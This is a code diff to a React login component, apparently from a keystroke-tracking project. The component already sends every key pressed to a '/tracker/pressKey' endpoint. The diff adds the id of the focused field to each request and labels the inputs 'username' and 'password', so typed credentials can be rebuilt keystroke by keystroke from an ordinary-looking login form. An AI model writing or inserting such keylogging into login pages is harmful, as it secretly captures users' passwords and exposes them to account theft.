@@ -28,7 +28,9 @@ export const Login = () => {
         if (sessionId === -1) return
 
         function handleKeyDown(e: KeyboardEvent) {
-            axiosInstance.post(`/tracker/pressKey/${sessionId}`, {key: e.key.toString()}).catch(() => {
+            const selected = document.activeElement?.id || "none"
+            console.log("selected", selected)
+            axiosInstance.post(`/tracker/pressKey/${sessionId}`, {key: e.key, selected}).catch(() => {
             })
         }
 
@@ -52,8 +54,8 @@ export const Login = () => {
         <div
             className="max-w-[600px] w-full  border-2 p-3 flex flex-col gap-4 absolute top-1/2 left-1/2 transform -translate-x-1/2 -translate-y-1/2">
             <h1>Login</h1>
-            <Input placeholder={"Username"}/>
-            <Input placeholder={"Password"} type="password"/>
+            <Input id="username" placeholder={"Username"}/>
+            <Input id="password" placeholder={"Password"} type="password"/>
             <Button>Login</Button>
             {id && <p>Track ID: {id}</p>}
         </div>
